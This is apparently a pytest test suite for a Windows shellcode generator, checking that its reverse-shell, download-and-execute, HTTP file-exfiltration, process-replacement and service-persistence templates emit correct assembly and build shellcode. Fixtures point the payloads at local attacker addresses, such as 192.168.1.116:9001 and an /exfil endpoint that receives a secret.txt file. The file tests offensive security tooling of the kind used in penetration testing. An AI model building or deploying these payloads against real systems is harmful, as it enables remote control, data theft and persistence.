"""Tests for payload template modules."""
from __future__ import annotations

import re
import socket
import struct

import pytest


@pytest.fixture
def revshell_manifest(manifest_dir):
    from emitera.schema import load
    return load(str(manifest_dir / "revshell.yaml"))


@pytest.fixture
def default_config():
    from emitera.payload_templates.base import TemplateConfig
    return TemplateConfig(lhost="192.168.1.116", lport=9001)


def test_reverse_shell_wsastartup_slot(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    assert revshell_layout.slot("WSAStartup").ebp_ref in asm


def test_reverse_shell_wsasocketa_slot(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    assert revshell_layout.slot("WSASocketA").ebp_ref in asm


def test_reverse_shell_connect_slot(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    assert revshell_layout.slot("connect").ebp_ref in asm


def test_reverse_shell_createprocessa_slot(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    assert revshell_layout.slot("CreateProcessA").ebp_ref in asm


def test_reverse_shell_socket_handle_slot(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    assert revshell_layout.slot("socket_handle").ebp_ref in asm


def test_reverse_shell_lhost_as_hex(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    lhost = default_config.lhost
    ip_le = struct.unpack("<I", socket.inet_aton(lhost))[0]
    asm = t.emit(revshell_layout, default_config)
    assert f"0x{ip_le:08x}" in asm


def test_reverse_shell_lport_as_hex(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    port_be = socket.htons(default_config.lport)
    asm = t.emit(revshell_layout, default_config)
    assert f"0x{port_be:04x}" in asm


def test_reverse_shell_no_hardcoded_offsets(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    # Every [ebp-0xNN] in the output must correspond to a known layout slot
    known_refs = {s.ebp_ref for s in revshell_layout.all_slots()}
    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"


def test_run_command_winexec_slot(manifest_dir, calc_layout):
    from emitera.payload_templates.run_command import RunCommandTemplate
    from emitera.payload_templates.base import TemplateConfig
    t = RunCommandTemplate()
    config = TemplateConfig(command="calc.exe", badchars={0x00})
    asm = t.emit(calc_layout, config)
    assert calc_layout.slot("WinExec").ebp_ref in asm


def test_run_command_uses_cmd_slot_when_available(manifest_dir, default_config):
    from emitera.payload_templates.run_command import RunCommandTemplate
    from emitera.schema import load
    from emitera.stack_alloc import build_layout
    from emitera.build import _merge_template_requirements
    t = RunCommandTemplate()
    manifest = load(str(manifest_dir / "revshell.yaml"))
    manifest = _merge_template_requirements(manifest, t, default_config)
    layout = build_layout(manifest)
    asm = t.emit(layout, default_config)
    cmd_ref = layout.slot("cmd").ebp_ref
    assert cmd_ref in asm
    assert "lea  eax" in asm


def test_run_command_inline_push_fallback():
    from emitera.payload_templates.run_command import RunCommandTemplate
    from emitera.payload_templates.base import TemplateConfig
    from emitera.schema import Manifest
    from emitera.stack_alloc import build_layout
    t = RunCommandTemplate()
    layout = build_layout(Manifest(
        badchars={0x00},
        functions=["WinExec"],
        strings=[],
    ))
    config = TemplateConfig(command="calc.exe", badchars={0x00})
    asm = t.emit(layout, config)
    assert layout.slot("WinExec").ebp_ref in asm
    assert "Command: calc.exe (inline push)" in asm


def test_calc_uses_initialized_cmd_slot(manifest_dir, tmp_path):
    from emitera.build import build
    from emitera.payload_templates.base import TemplateConfig
    result = build(
        str(manifest_dir / "calc.yaml"),
        template_name="run_command",
        config=TemplateConfig(),
        out_dir=str(tmp_path),
        assemble=False,
    )
    cmd_slot = result.layout.slot("cmd")
    assert cmd_slot.category == "string"
    assert "Command: calc.exe (from 'cmd' slot" in result.asm
    assert f"lea  eax, {cmd_slot.ebp_ref}" in result.asm
    assert "Command: cmd.exe" not in result.asm


def test_reverse_shell_cmd_slot_referenced(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    cmd_ref = revshell_layout.slot("cmd").ebp_ref
    assert cmd_ref in asm


def test_reverse_shell_startupinfoa_slot(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    assert revshell_layout.slot("STARTUPINFOA").ebp_ref in asm


def test_reverse_shell_wsadata_slot(revshell_layout, default_config):
    from emitera.payload_templates.reverse_shell import ReverseShellTemplate
    t = ReverseShellTemplate()
    asm = t.emit(revshell_layout, default_config)
    assert revshell_layout.slot("WSADATA").ebp_ref in asm


# ---------------------------------------------------------------------------
# Auto-derivation: probe_slots and _merge_template_requirements
# ---------------------------------------------------------------------------


class TestProbeSlots:
    """PayloadTemplate.probe_slots discovers slot references from emit()."""

    def test_reverse_shell_probe_includes_apis(self, default_config):
        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
        slots = ReverseShellTemplate().probe_slots(default_config)
        for api in ("WSAStartup", "WSASocketA", "connect", "CreateProcessA"):
            assert api in slots

    def test_reverse_shell_probe_includes_variables(self, default_config):
        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
        slots = ReverseShellTemplate().probe_slots(default_config)
        assert "socket_handle" in slots

    def test_reverse_shell_probe_includes_structures(self, default_config):
        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
        slots = ReverseShellTemplate().probe_slots(default_config)
        for struct in ("WSADATA", "sockaddr_in", "STARTUPINFOA", "PROCESS_INFORMATION"):
            assert struct in slots

    def test_probe_returns_unique_names(self, default_config):
        from emitera.payload_templates.tcp_download import TcpDownloadTemplate
        slots = TcpDownloadTemplate().probe_slots(default_config)
        assert len(slots) == len(set(slots))

    def test_run_command_probe_includes_optional_cmd(self):
        from emitera.payload_templates.run_command import RunCommandTemplate
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(command="calc.exe")
        slots = RunCommandTemplate().probe_slots(config)
        assert "WinExec" in slots
        assert "cmd" in slots


class TestMergeTemplateRequirements:
    """_merge_template_requirements auto-adds missing APIs only."""

    def test_adds_missing_api(self, manifest_dir):
        from emitera.schema import load
        from emitera.build import _merge_template_requirements
        from emitera.payload_templates.run_command import RunCommandTemplate
        from emitera.payload_templates.base import TemplateConfig
        manifest = load(str(manifest_dir / "revshell.yaml"))
        assert "WinExec" not in manifest.functions
        config = TemplateConfig()
        merged = _merge_template_requirements(manifest, RunCommandTemplate(), config)
        assert "WinExec" in merged.functions

    def test_does_not_auto_add_variables(self, manifest_dir):
        from emitera.schema import load
        from emitera.build import _merge_template_requirements
        from emitera.payload_templates.bind_shell import BindShellTemplate
        from emitera.payload_templates.base import TemplateConfig
        manifest = load(str(manifest_dir / "revshell.yaml"))
        config = TemplateConfig()
        merged = _merge_template_requirements(manifest, BindShellTemplate(), config)
        assert merged.variables == manifest.variables

    def test_does_not_duplicate_existing(self, manifest_dir):
        from emitera.schema import load
        from emitera.build import _merge_template_requirements
        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
        from emitera.payload_templates.base import TemplateConfig
        manifest = load(str(manifest_dir / "revshell.yaml"))
        config = TemplateConfig()
        merged = _merge_template_requirements(manifest, ReverseShellTemplate(), config)
        assert merged.functions.count("WSAStartup") == 1
        assert merged.functions.count("connect") == 1

    def test_auto_adds_loadlibrarya_for_ws2(self):
        from emitera.schema import Manifest, StringEntry
        from emitera.build import _merge_template_requirements
        from emitera.payload_templates.tcp_stager import TcpStagerTemplate
        from emitera.payload_templates.base import TemplateConfig
        bare = Manifest(badchars={0x00}, functions=[], strings=[
            StringEntry(label="ws2_dll", value="ws2_32.dll", method="push"),
        ])
        config = TemplateConfig()
        merged = _merge_template_requirements(bare, TcpStagerTemplate(), config)
        assert "LoadLibraryA" in merged.functions

    def test_noop_when_manifest_complete(self, manifest_dir):
        from emitera.schema import load
        from emitera.build import _merge_template_requirements
        from emitera.payload_templates.reverse_shell import ReverseShellTemplate
        from emitera.payload_templates.base import TemplateConfig
        manifest = load(str(manifest_dir / "revshell.yaml"))
        config = TemplateConfig()
        merged = _merge_template_requirements(manifest, ReverseShellTemplate(), config)
        assert merged.functions == manifest.functions

    def test_build_with_incomplete_manifest_succeeds(self, manifest_dir, tmp_path):
        """An incomplete manifest + template should auto-fill and build."""
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        result = build(
            str(manifest_dir / "calc.yaml"),
            template_name="run_command",
            config=TemplateConfig(command="calc.exe"),
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert "WinExec" in result.asm


# ---------------------------------------------------------------------------
# HTTP download template
# ---------------------------------------------------------------------------


@pytest.fixture
def http_config():
    from emitera.payload_templates.base import TemplateConfig
    return TemplateConfig(
        lhost="192.168.1.10",
        lport=8000,
        url="http://192.168.1.10:8000/payload.exe",
        dst_path="C:\\Windows\\Temp\\payload.exe",
    )


def test_http_download_inet_open_slot(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    assert http_download_layout.slot("InternetOpenA").ebp_ref in asm


def test_http_download_inet_openurl_slot(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    assert http_download_layout.slot("InternetOpenUrlA").ebp_ref in asm


def test_http_download_inet_readfile_slot(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    assert http_download_layout.slot("InternetReadFile").ebp_ref in asm


def test_http_download_inet_close_slot(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    assert http_download_layout.slot("InternetCloseHandle").ebp_ref in asm


def test_http_download_virtualalloc_slot(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    assert http_download_layout.slot("VirtualAlloc").ebp_ref in asm


def test_http_download_createfile_slot(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    assert http_download_layout.slot("CreateFileA").ebp_ref in asm


def test_http_download_winexec_slot(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    assert http_download_layout.slot("WinExec").ebp_ref in asm


def test_http_download_variable_slots(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    for var in ("inet_session", "inet_url", "virt_buf", "file_handle",
                "bytes_read", "bytes_total"):
        assert http_download_layout.slot(var).ebp_ref in asm, f"{var} not referenced"


def test_http_download_string_slots(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    for label in ("user_agent", "url", "dst_path"):
        assert http_download_layout.slot(label).ebp_ref in asm, f"{label} not referenced"


def test_http_download_no_hardcoded_offsets(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    known_refs = {s.ebp_ref for s in http_download_layout.all_slots()}
    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"


def test_http_download_read_loop_bounds_check(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    assert "buffer full" in asm
    assert "http_read_loop:" in asm
    assert "http_read_done:" in asm
    assert "http_read_sized:" in asm


def test_http_download_checks_return_value(http_download_layout, http_config):
    from emitera.payload_templates.http_download import HttpDownloadTemplate
    t = HttpDownloadTemplate()
    asm = t.emit(http_download_layout, http_config)
    lines = asm.splitlines()
    read_call_idx = None
    for i, line in enumerate(lines):
        if "InternetReadFile" in line and "call" not in line:
            continue
        if "call" in line and read_call_idx is None:
            if i > 0 and "InternetReadFile" in lines[i - 1]:
                continue
        if "call dword ptr" in line:
            stripped = line.strip()
            inet_read_ref = http_download_layout.slot("InternetReadFile").ebp_ref
            if inet_read_ref in stripped:
                read_call_idx = i
                break
    assert read_call_idx is not None, "InternetReadFile call not found"
    post_call = "\n".join(lines[read_call_idx + 1 : read_call_idx + 5])
    assert "test eax, eax" in post_call, "Return value not checked after InternetReadFile"


class TestHttpDownloadProbeSlots:

    def test_probe_includes_wininet_apis(self, http_config):
        from emitera.payload_templates.http_download import HttpDownloadTemplate
        slots = HttpDownloadTemplate().probe_slots(http_config)
        for api in ("InternetOpenA", "InternetOpenUrlA", "InternetReadFile",
                     "InternetCloseHandle"):
            assert api in slots

    def test_probe_includes_kernel32_apis(self, http_config):
        from emitera.payload_templates.http_download import HttpDownloadTemplate
        slots = HttpDownloadTemplate().probe_slots(http_config)
        for api in ("VirtualAlloc", "CreateFileA", "WriteFile", "CloseHandle", "WinExec"):
            assert api in slots

    def test_probe_includes_variables(self, http_config):
        from emitera.payload_templates.http_download import HttpDownloadTemplate
        slots = HttpDownloadTemplate().probe_slots(http_config)
        for var in ("inet_session", "inet_url", "virt_buf", "file_handle",
                     "bytes_read", "bytes_total"):
            assert var in slots

    def test_probe_includes_strings(self, http_config):
        from emitera.payload_templates.http_download import HttpDownloadTemplate
        slots = HttpDownloadTemplate().probe_slots(http_config)
        for label in ("user_agent", "url", "dst_path"):
            assert label in slots

    def test_probe_returns_unique(self, http_config):
        from emitera.payload_templates.http_download import HttpDownloadTemplate
        slots = HttpDownloadTemplate().probe_slots(http_config)
        assert len(slots) == len(set(slots))


class TestHttpDownloadAutoDerive:

    def test_auto_adds_loadlibrarya_for_wininet(self):
        from emitera.schema import Manifest, StringEntry
        from emitera.build import _merge_template_requirements
        from emitera.payload_templates.http_download import HttpDownloadTemplate
        from emitera.payload_templates.base import TemplateConfig
        bare = Manifest(badchars={0x00}, functions=[], strings=[
            StringEntry(label="wininet_dll", value="wininet.dll", method="push"),
            StringEntry(label="user_agent", value="Mozilla/5.0", method="mov"),
            StringEntry(label="url", value="http://x/p", method="mov"),
            StringEntry(label="dst_path", value="C:\\p.exe", method="mov"),
        ])
        config = TemplateConfig(url="http://x/p", dst_path="C:\\p.exe")
        merged = _merge_template_requirements(bare, HttpDownloadTemplate(), config)
        assert "LoadLibraryA" in merged.functions
        assert "InternetOpenA" in merged.functions

    def test_full_build_succeeds(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            url="http://192.168.1.10:8000/payload.exe",
            dst_path="C:\\Windows\\Temp\\payload.exe",
        )
        result = build(
            str(manifest_dir / "http_download.yaml"),
            config=config,
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert "InternetOpenA" in result.asm
        assert "InternetReadFile" in result.asm
        assert "http_read_loop:" in result.asm
        assert "wininet.dll" in result.asm
        assert result.layout is not None

    def test_url_cli_override(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            url="http://10.0.0.1:9999/custom.bin",
            dst_path="C:\\Windows\\Temp\\payload.exe",
        )
        result = build(
            str(manifest_dir / "http_download.yaml"),
            config=config,
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert "http://10.0.0.1:9999/custom.bin" in result.asm


# ---------------------------------------------------------------------------
# HTTP Exfil (POST) template tests
# ---------------------------------------------------------------------------


@pytest.fixture
def exfil_config():
    from emitera.payload_templates.base import TemplateConfig
    return TemplateConfig(
        lhost="192.168.1.10",
        lport=8000,
        src_path="C:\\Users\\admin\\secret.txt",
        url_path="/exfil",
    )


def test_http_exfil_createfile_slot(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert http_exfil_layout.slot("CreateFileA").ebp_ref in asm


def test_http_exfil_readfile_slot(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert http_exfil_layout.slot("ReadFile").ebp_ref in asm


def test_http_exfil_inet_open_slot(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert http_exfil_layout.slot("InternetOpenA").ebp_ref in asm


def test_http_exfil_inet_connect_slot(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert http_exfil_layout.slot("InternetConnectA").ebp_ref in asm


def test_http_exfil_http_open_slot(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert http_exfil_layout.slot("HttpOpenRequestA").ebp_ref in asm


def test_http_exfil_http_send_slot(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert http_exfil_layout.slot("HttpSendRequestA").ebp_ref in asm


def test_http_exfil_inet_close_slot(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert http_exfil_layout.slot("InternetCloseHandle").ebp_ref in asm


def test_http_exfil_variable_slots(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    for var in ["inet_session", "inet_connect", "inet_request",
                "file_handle", "virt_buf", "bytes_read", "bytes_total"]:
        assert http_exfil_layout.slot(var).ebp_ref in asm, f"missing var {var}"


def test_http_exfil_string_slots(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    for s in ["src_path", "exfil_host", "url_path", "http_post", "user_agent"]:
        assert http_exfil_layout.slot(s).ebp_ref in asm, f"missing string {s}"


def test_http_exfil_no_hardcoded_offsets(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    import re
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    known_refs = {s.ebp_ref for s in http_exfil_layout.all_slots()}
    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"


def test_http_exfil_read_loop_bounds_check(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert "exfil_read_loop:" in asm
    assert "exfil_read_done" in asm
    assert "buffer full" in asm
    assert "exfil_read_sized" in asm


def test_http_exfil_generic_read(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert "GENERIC_READ" in asm
    assert "OPEN_EXISTING" in asm


def test_http_exfil_post_verb(http_exfil_layout, exfil_config):
    from emitera.payload_templates.http_exfil import HttpExfilTemplate
    t = HttpExfilTemplate()
    asm = t.emit(http_exfil_layout, exfil_config)
    assert "POST" in asm


class TestHttpExfilProbeSlots:
    def test_discovers_all_api_slots(self, exfil_config):
        from emitera.payload_templates.http_exfil import HttpExfilTemplate
        t = HttpExfilTemplate()
        slots = t.probe_slots(exfil_config)
        for api in ["CreateFileA", "ReadFile", "CloseHandle", "VirtualAlloc",
                     "InternetOpenA", "InternetConnectA", "HttpOpenRequestA",
                     "HttpSendRequestA", "InternetCloseHandle"]:
            assert api in slots, f"missing API slot: {api}"

    def test_discovers_variable_slots(self, exfil_config):
        from emitera.payload_templates.http_exfil import HttpExfilTemplate
        t = HttpExfilTemplate()
        slots = t.probe_slots(exfil_config)
        for var in ["inet_session", "inet_connect", "inet_request",
                     "file_handle", "virt_buf", "bytes_read", "bytes_total"]:
            assert var in slots, f"missing var slot: {var}"

    def test_discovers_string_slots(self, exfil_config):
        from emitera.payload_templates.http_exfil import HttpExfilTemplate
        t = HttpExfilTemplate()
        slots = t.probe_slots(exfil_config)
        for s in ["src_path", "exfil_host", "url_path", "http_post", "user_agent"]:
            assert s in slots, f"missing string slot: {s}"


class TestHttpExfilAutoDerive:
    def test_auto_derives_missing_apis(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            lhost="192.168.1.10",
            lport=8000,
            src_path="C:\\secret.txt",
            url_path="/exfil",
        )
        result = build(
            str(manifest_dir / "http_exfil.yaml"),
            config=config,
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert "HttpSendRequestA" in result.asm

    def test_full_build_assembles(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            lhost="192.168.1.10",
            lport=8000,
            src_path="C:\\secret.txt",
            url_path="/exfil",
        )
        result = build(
            str(manifest_dir / "http_exfil.yaml"),
            config=config,
            out_dir=str(tmp_path),
        )
        assert result.shellcode_bytes is not None
        assert len(result.shellcode_bytes) > 0


# ---------------------------------------------------------------------------
# Process Replace (Kill-Copy-Restart)
# ---------------------------------------------------------------------------

@pytest.fixture
def pr_config():
    from emitera.payload_templates.base import TemplateConfig
    return TemplateConfig(
        process_name="notepad.exe",
        src_path="C:\\Windows\\Temp\\payload.exe",
        dst_path="C:\\Program Files\\target\\target.exe",
    )


def test_process_replace_snapshot_slot(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert process_replace_layout.slot("CreateToolhelp32Snapshot").ebp_ref in asm


def test_process_replace_p32first_slot(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert process_replace_layout.slot("Process32First").ebp_ref in asm


def test_process_replace_p32next_slot(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert process_replace_layout.slot("Process32Next").ebp_ref in asm


def test_process_replace_openprocess_slot(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert process_replace_layout.slot("OpenProcess").ebp_ref in asm


def test_process_replace_terminate_slot(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert process_replace_layout.slot("TerminateProcess").ebp_ref in asm


def test_process_replace_wait_slot(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert process_replace_layout.slot("WaitForSingleObject").ebp_ref in asm


def test_process_replace_variable_slots(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert process_replace_layout.slot("snapshot_handle").ebp_ref in asm
    assert process_replace_layout.slot("target_pid").ebp_ref in asm


def test_process_replace_string_slots(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert process_replace_layout.slot("process_name").ebp_ref in asm
    assert process_replace_layout.slot("src_path").ebp_ref in asm
    assert process_replace_layout.slot("dst_path").ebp_ref in asm


def test_process_replace_no_hardcoded_offsets(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    import re
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    known_refs = {s.ebp_ref for s in process_replace_layout.all_slots()}
    for ref in re.findall(r'\[ebp-0x[0-9a-f]+\]', asm):
        assert ref in known_refs, f"Hardcoded offset {ref} not in layout"


def test_process_replace_enum_loop(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert "pr_enum_loop:" in asm
    assert "pr_strcmp:" in asm
    assert "pr_found:" in asm
    assert "pr_not_found:" in asm
    assert "pr_do_copy:" in asm


def test_process_replace_case_insensitive_compare(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert "or   al, 0x20" in asm
    assert "or   cl, 0x20" in asm


def test_process_replace_pe32_size(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    assert "PROCESSENTRY32.dwSize = 0x128" in asm


def test_process_replace_wait_before_close(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    wait_ref = process_replace_layout.slot("WaitForSingleObject").ebp_ref
    close_ref = process_replace_layout.slot("CloseHandle").ebp_ref
    lines = asm.splitlines()
    wait_idx = next(i for i, l in enumerate(lines) if wait_ref in l and "call" in l)
    kill_close_idx = next(
        i for i, l in enumerate(lines)
        if close_ref in l and "call" in l and i > wait_idx
    )
    assert kill_close_idx > wait_idx


def test_process_replace_copyfile_checked(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    copy_ref = process_replace_layout.slot("CopyFileA").ebp_ref
    lines = asm.splitlines()
    copy_idx = next(i for i, l in enumerate(lines) if copy_ref in l and "call" in l)
    post = "\n".join(lines[copy_idx + 1 : copy_idx + 4])
    assert "test eax, eax" in post
    assert "jz" in post


def test_process_replace_not_found_closes_snapshot(process_replace_layout, pr_config):
    from emitera.payload_templates.process_replace import ProcessReplaceTemplate
    t = ProcessReplaceTemplate()
    asm = t.emit(process_replace_layout, pr_config)
    lines = asm.splitlines()
    nf_idx = next(i for i, l in enumerate(lines) if "pr_not_found:" in l)
    copy_jmp = next(
        i for i, l in enumerate(lines) if "pr_do_copy" in l and i > nf_idx
    )
    between = "\n".join(lines[nf_idx:copy_jmp])
    close_ref = process_replace_layout.slot("CloseHandle").ebp_ref
    assert close_ref in between


class TestProcessReplaceProbeSlots:
    def test_discovers_api_slots(self, pr_config):
        from emitera.payload_templates.process_replace import ProcessReplaceTemplate
        t = ProcessReplaceTemplate()
        slots = t.probe_slots(pr_config)
        for api in [
            "CreateToolhelp32Snapshot", "Process32First", "Process32Next",
            "OpenProcess", "TerminateProcess", "WaitForSingleObject",
            "CloseHandle", "CopyFileA", "WinExec",
        ]:
            assert api in slots, f"probe_slots did not discover {api}"


class TestProcessReplaceAutoDerive:
    def test_full_build_assembles(self, manifest_dir, tmp_path):
        from emitera.build import build
        from emitera.payload_templates.base import TemplateConfig
        config = TemplateConfig(
            process_name="notepad.exe",
            src_path="C:\\payload.exe",
            dst_path="C:\\target.exe",
        )
        result = build(
            str(manifest_dir / "process_replace.yaml"),
            config=config,
            out_dir=str(tmp_path),
        )
        assert result.shellcode_bytes is not None
        assert len(result.shellcode_bytes) > 0


# ---------------------------------------------------------------------------
# Service Persistence
# ---------------------------------------------------------------------------

@pytest.fixture
def svc_config():
    from emitera.payload_templates.base import TemplateConfig
    return TemplateConfig(
        service_name="TestSvc",
        dst_path="C:\\Windows\\Temp\\svc.exe",
    )


def test_service_persist_openscm_slot(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    assert service_persist_layout.slot("OpenSCManagerA").ebp_ref in asm


def test_service_persist_createsvc_slot(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    assert service_persist_layout.slot("CreateServiceA").ebp_ref in asm


def test_service_persist_startsvc_slot(service_persist_layout, svc_config):
    from emitera.payload_templates.service_persist import ServicePersistTemplate
    t = ServicePersistTemplate()
    asm = t.emit(service_persist_layout, svc_config)
    assert service_persist_layout.slot("StartServiceA").ebp_ref in asm


